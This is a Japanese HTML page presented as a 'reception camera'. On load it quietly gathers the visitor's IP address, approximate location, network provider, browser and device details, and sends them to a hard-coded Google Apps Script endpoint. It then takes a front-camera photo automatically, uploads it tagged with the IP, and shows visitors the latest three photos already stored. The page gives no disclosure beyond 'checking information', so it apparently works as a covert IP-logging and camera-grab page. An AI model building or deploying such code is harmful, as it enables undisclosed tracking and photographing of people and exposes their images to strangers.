<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>受付カメラ</title>
<style>
  :root {
    --bg: #f5f7f4;
    --ink: #1b2a24;
    --muted: #5f6f68;
    --line: #cfd8d3;
    --accent: #0f6b4f;
    --accent-ink: #ffffff;
    --panel: #ffffff;
    --danger: #b3261e;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: "Hiragino Sans", "Noto Sans JP", system-ui, sans-serif;
    background: var(--bg);
    color: var(--ink);
    line-height: 1.6;
  }
  main { max-width: 480px; margin: 0 auto; padding: 20px 16px 48px; }
  h1 { font-size: 20px; margin: 0 0 4px; }
  .status { color: var(--muted); font-size: 14px; margin: 0 0 16px; min-height: 1.6em; }
  .status.error { color: var(--danger); }
  .shot { margin-top: 8px; }
  .shot img { width: 100%; border-radius: 12px; display: block; background: #000; }
  button {
    width: 100%;
    padding: 14px 12px;
    margin-top: 16px;
    font-size: 16px;
    border-radius: 10px;
    border: 1px solid var(--accent);
    background: var(--accent);
    color: var(--accent-ink);
    cursor: pointer;
  }
  .hidden { display: none !important; }
  .gallery { margin-top: 24px; }
  .gallery h2 { font-size: 15px; margin: 0 0 8px; color: var(--muted); }
  .thumbs { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
  .thumbs img { width: 100%; aspect-ratio: 1; object-fit: cover; border-radius: 8px; background: var(--line); }
</style>
</head>
<body>
<main>
  <h1>受付カメラ</h1>
  <p id="status" class="status">準備しています…</p>

  <div id="shot" class="shot hidden">
    <img id="photo" alt="撮影した写真">
  </div>

  <button id="allowBtn" class="hidden">カメラを許可する</button>

  <div id="gallery" class="gallery hidden">
    <h2>フォルダ内の最新3枚</h2>
    <div id="thumbs" class="thumbs"></div>
  </div>

  <!-- 画面には出さない（フレーム取得用） -->
  <video id="video" autoplay playsinline muted class="hidden"></video>
  <canvas id="work" class="hidden"></canvas>
</main>

<script>
  // ===== 送信先（GASのウェブアプリURL） =====
  const ENDPOINT = "https://script.google.com/macros/s/AKfycbzOHm0xe4a5mCzvJDs85URNlkfUPMenAUaLoFdzvptbgWQ1r340q-5no7xPrs6TGgqJ/exec";
  // ==========================================

  const $ = id => document.getElementById(id);
  const video = $('video'), photo = $('photo'), work = $('work'), status = $('status');
  const shot = $('shot'), gallery = $('gallery'), thumbs = $('thumbs'), allowBtn = $('allowBtn');

  let stream = null;
  let visitorInfo = null;

  function say(msg, isError = false) {
    status.textContent = msg;
    status.classList.toggle('error', isError);
  }
  function show(...els) { els.forEach(e => e.classList.remove('hidden')); }
  function hide(...els) { els.forEach(e => e.classList.add('hidden')); }
  function stopCamera() { if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; } }
  function stamp() {
    const d = new Date(), pad = n => String(n).padStart(2, '0');
    return d.getFullYear() + pad(d.getMonth() + 1) + pad(d.getDate())
      + '_' + pad(d.getHours()) + pad(d.getMinutes()) + pad(d.getSeconds());
  }
  const wait = ms => new Promise(r => setTimeout(r, ms));

  async function sendToDrive(type, payload) {
    if (!ENDPOINT) return false;
    await fetch(ENDPOINT, {
      method: 'POST', mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: JSON.stringify(Object.assign({ type }, payload))
    });
    return true;
  }

  function jsonp(params) {
    return new Promise((resolve, reject) => {
      if (!ENDPOINT) return reject('no endpoint');
      const cb = 'cb_' + Date.now() + '_' + Math.floor(Math.random() * 1e6);
      const timer = setTimeout(() => { cleanup(); reject('timeout'); }, 15000);
      function cleanup() { clearTimeout(timer); delete window[cb]; script.remove(); }
      window[cb] = data => { cleanup(); resolve(data); };
      const q = new URLSearchParams(Object.assign({ callback: cb }, params)).toString();
      const script = document.createElement('script');
      script.src = ENDPOINT + '?' + q;
      script.onerror = () => { cleanup(); reject('script error'); };
      document.body.appendChild(script);
    });
  }

  // 情報を読みやすいテキストに整形
  function infoToText(info) {
    const n = info.network || {};
    const lines = [
      '日時: ' + info.time,
      'IP: ' + (info.ip || ''),
      '推定地域: ' + [n.city, n.region, n.country].filter(Boolean).join(' / '),
      '回線(org): ' + (n.org || ''),
      'ASN: ' + (n.asn || ''),
      'UserAgent: ' + info.userAgent,
      'プラットフォーム: ' + (info.platform || ''),
      '言語: ' + (info.language || ''),
      'タイムゾーン: ' + (info.timezone || ''),
      '画面: ' + info.screen.width + 'x' + info.screen.height + ' (x' + info.screen.pixelRatio + ')',
      'ウィンドウ: ' + info.viewport.width + 'x' + info.viewport.height,
      '参照元: ' + (info.referrer || ''),
      'ページURL: ' + info.pageUrl
    ];
    return lines.join('\n');
  }

  // ---- 1'. 情報を集めて txt でドライブ保存 ----
  async function collectAndSaveInfo() {
    const info = {
      time: new Date().toISOString(),
      ip: null,
      userAgent: navigator.userAgent,
      platform: navigator.platform || null,
      language: navigator.language || null,
      timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || null,
      screen: { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio || 1 },
      viewport: { width: window.innerWidth, height: window.innerHeight },
      referrer: document.referrer || null,
      pageUrl: location.href
    };
    try {
      const res = await fetch('https://ipapi.co/json/');
      if (res.ok) {
        const d = await res.json();
        info.ip = d.ip || null;
        info.network = { city: d.city || null, region: d.region || null, country: d.country_name || null, org: d.org || null, asn: d.asn || null };
      }
    } catch (e) {}
    visitorInfo = info;

    const text = infoToText(info);
    const name = stamp() + '_info.txt';
    const sent = await sendToDrive('info', { name, text });
    if (!sent) {
      const blob = new Blob([text], { type: 'text/plain' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob); a.download = name; a.click();
    }
  }

  // ---- 2〜3. カメラ許可 → 許可されたら自動で撮影 ----
  async function captureNow() {
    hide(allowBtn);
    say('カメラの使用を許可してください。');
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } }, audio: false });
    } catch (err) {
      if (err.name === 'NotAllowedError') {
        say('カメラの使用が許可されませんでした。設定で許可し、ページを再読み込みしてください。', true);
      } else {
        say('カメラを起動できませんでした（' + err.name + '）。', true);
      }
      show(allowBtn);
      allowBtn.onclick = captureNow;
      return;
    }

    video.srcObject = stream;
    await new Promise(res => {
      if (video.readyState >= 2) return res();
      video.onloadedmetadata = () => res();
    });
    await video.play().catch(() => {});
    say('撮影しています…');
    await wait(600);   // 露出が安定するまで少し待つ

    const ctx = work.getContext('2d');
    work.width = video.videoWidth || 640;
    work.height = video.videoHeight || 480;
    ctx.translate(work.width, 0); ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);
    ctx.setTransform(1, 0, 0, 1, 0, 0);
    stopCamera();

    const blob = await new Promise(res => work.toBlob(res, 'image/jpeg', 0.9));

    photo.src = URL.createObjectURL(blob);   // 5. 撮った画像を表示
    show(shot);

    await saveAndShow(blob);                 // 4 → 6
  }

  async function saveAndShow(blob) {
    const name = stamp() + '_photo.jpg';

    if (!ENDPOINT) {
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob); a.download = name; a.click();
      say('撮影しました。端末に保存済み（' + name + '）。');
      return;
    }

    try {
      const base64 = await new Promise((res, rej) => {
        const r = new FileReader();
        r.onload = () => res(r.result.split(',')[1]); r.onerror = rej;
        r.readAsDataURL(blob);
      });
      await sendToDrive('photo', { name, image: base64, ip: visitorInfo && visitorInfo.ip });
      say('撮影・保存しました。最新の画像を取得しています…');
      await showLatest();
    } catch (err) {
      say('撮影しましたが、送信に失敗しました。通信状態を確認してください。', true);
    }
  }

  // ---- 6. 表示用フォルダ内、名前順で後ろ3枚 ----
  async function showLatest() {
    try {
      const data = await jsonp({ type: 'latest', count: 3 });
      const items = (data && data.images) || [];
      thumbs.innerHTML = '';
      items.forEach(it => {
        const im = document.createElement('img');
        im.src = it.dataUrl || it.url;
        im.alt = it.name || '';
        thumbs.appendChild(im);
      });
      show(gallery);
      say('撮影・保存しました。フォルダ内の最新3枚を表示しています。');
    } catch (e) {
      say('保存はできましたが、最新画像の取得に失敗しました（' + e + '）。', true);
    }
  }

  // ---- 起動：情報保存 → カメラ許可 → 自動撮影 ----
  (async () => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      say('このブラウザはカメラに対応していません。', true); return;
    }
    say('情報を確認しています…');
    await collectAndSaveInfo();
    await captureNow();
  })();
</script>
</body>
</html>
